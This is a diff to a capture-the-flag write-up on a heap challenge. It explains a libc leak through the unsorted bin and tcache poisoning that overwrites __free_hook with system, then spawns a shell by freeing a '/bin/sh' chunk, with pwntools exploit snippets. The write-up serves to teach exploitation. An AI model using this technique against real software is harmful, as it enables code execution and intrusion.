@@ -21,7 +21,7 @@ categories = [
 ## Overview 
 This binary was a classic heap-based program where we could add multiple songs and comments, as well as view and delete them.
 Protections enabled were: PIE, Canary, NX, and Full RELRO.
-Initially, I spent quite some time trying to figure out the exploitation strategy. Then, I randomly checked the libc version and noticed it was 2.31 so there was no pointer mangling(safe linking) in tcache and __free_hook function was also present in this libc.
+Initially, I spent quite some time trying to figure out the exploitation strategy. Then, I randomly checked the libc version and noticed it was 2.31 so there was no pointer mangling(safe linking) in tcache and `__free_hook` function was also present in this libc.
 
 ## Reversed Code
 
@@ -57,7 +57,8 @@ libc.address=libcbase
 
 `b` is a guard chunk so that when the first chunk goes into the unsorted bin it doesn’t get consolidated with the wilderness. After freeing the first chunk, its fd pointer contains the address of the main arena head, which is a libc address. So i leaked this and calculated the libc base.
 
-For `__free_hook` I used tcache poisoning by changing the fd of a tcache chunk to point to `__free_hook`. Since there’s no safe-linking, I could directly overwrite the fd without mangling.
+Now my plan was to overwrite `__free_hook` with address of `system`. To write to __free_hook i needed to get its chunk from a malloc so I used tcache poisoning by changing the fd of a tcache chunk to point to `__free_hook`. Since there’s no safe-linking, I could directly overwrite the fd without mangling.
+After getting the chunk , i wrote the address of `system` in `__free_hook` , so that whenever free is called it will call system with the same argument the free was called on.
 
 ```python
 freehook=libc.symbols['__free_hook']  
@@ -73,7 +74,7 @@ addsong(b'e',8) #4
 addsong(p64(system),8) #5  
 ```
 
-After getting the chunk , i wrote the address of `system` in `__free_hook` , so that whenever free is called it will call system with the same argument the free was called on. At last i just add another chunk and free it to execute the exploit.
+At last i just add another chunk with `/bin/sh` as its content which will act as an argument when free is called.
 
 ```python
 addsong(b'/bin/sh',20) #6  
@@ -135,7 +136,6 @@ libcbase = leak - 0x1ecbe0
 libc.address = libcbase
 log.critical(f"libcbase : {libcbase:#x}")
 
-# Ovewriting __free_hook
 freehook = libc.symbols['__free_hook']
 system   = libc.symbols['system']
 binsh    = next(libc.search(b'/bin/sh'))
@@ -148,9 +148,9 @@ addsong(b'c',8) #2
 addsong(b'd',8) #3
 delete(2)
 delete(3)
-edit(3, 8, p64(freehook))
+edit(3, 8, b''+p64(freehook))
 addsong(b'e',8) #4
-addsong(p64(system),8) #5
+addsong(b''+p64(system),8) #5
 
 # Trigger exploit
 addsong(b'/bin/sh',20) #6
